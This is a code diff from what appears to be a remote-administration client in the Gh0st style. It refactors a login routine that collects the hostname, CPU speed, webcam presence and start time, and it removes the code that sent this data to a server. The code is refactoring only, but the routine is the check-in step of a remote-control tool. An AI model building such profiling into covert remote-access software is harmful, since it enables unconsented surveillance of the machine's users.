@@ -178,7 +178,7 @@ std::string getProcessTime() {
 	return buffer;
 }
 
-int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed, int nType)
+LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, int nType)
 {
 	LOGIN_INFOR  LoginInfor;
 	LoginInfor.bToken = TOKEN_LOGIN; // 令牌为登录
@@ -188,12 +188,6 @@ int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed, int nType)
 	//获得PCName
 	char szPCName[MAX_PATH] = {0};
 	gethostname(szPCName, MAX_PATH);  
-
-	//获得ClientIP
-	sockaddr_in  ClientAddr;
-	memset(&ClientAddr, 0, sizeof(ClientAddr));
-	int iLen = sizeof(sockaddr_in);
-	getsockname(ClientObject->m_sClientSocket, (SOCKADDR*)&ClientAddr, &iLen);
 
 	DWORD	dwCPUMHz;
 	dwCPUMHz = CPUClockMHz();
@@ -205,10 +199,9 @@ int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed, int nType)
 	LoginInfor.dwCPUMHz = dwCPUMHz;
 	LoginInfor.bWebCamIsExist = bWebCamIsExist;
 	strcpy_s(LoginInfor.szStartTime, getProcessTime().c_str());
-	sprintf_s(LoginInfor.szReserved, "%s", nType==CLIENT_TYPE_DLL?"DLL":"EXE");
-	int iRet = ClientObject->OnServerSending((char*)&LoginInfor, sizeof(LOGIN_INFOR));   
+	sprintf_s(LoginInfor.szReserved, "%s", GetClientType(nType));
 
-	return iRet;
+	return LoginInfor;
 }
 
 
